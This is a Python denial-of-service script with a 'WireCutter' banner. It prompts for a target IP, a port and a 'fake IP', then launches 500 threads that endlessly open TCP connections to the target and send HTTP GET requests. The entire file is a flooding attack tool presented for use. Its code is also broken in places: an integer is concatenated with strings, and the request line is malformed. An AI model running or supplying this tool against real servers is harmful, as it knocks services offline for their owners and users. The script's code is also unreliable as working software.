import threading
import socket

print('  __      __.__               _________         __    __                \n /  \    /  \__|______   ____ \_   ___ \ __ ___/  |__/  |_  ___________ \n \   \/\/   /  \_  __ \_/ __ \/    \  \/|  |  \   __\   __\/ __ \_  __ \ \n  \        /|  ||  | \/\  ___/\     \___|  |  /|  |  |  | \  ___/|  | \/ \n   \__/\  / |__||__|    \___  >\______  /____/ |__|  |__|  \___  >__|   \n        \/                  \/        \/                       \/      ')

    # This is where you will input the target IP and port
target = input('What is your target IP ')
port = int(input('What port are you targeting '))

    #if you would like, you can also try and use a fake_ip, this will not help hide your identity however.
fake_ip = int(input('What is your fake IP '))

already_connected = 0

def startattack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global already_connected
        already_connected += 1 
        if already_connected % 500 == 0:
            print(already_connected)

for i in range(500):
    thread = threading.Thread(target=startattack)
    thread.start()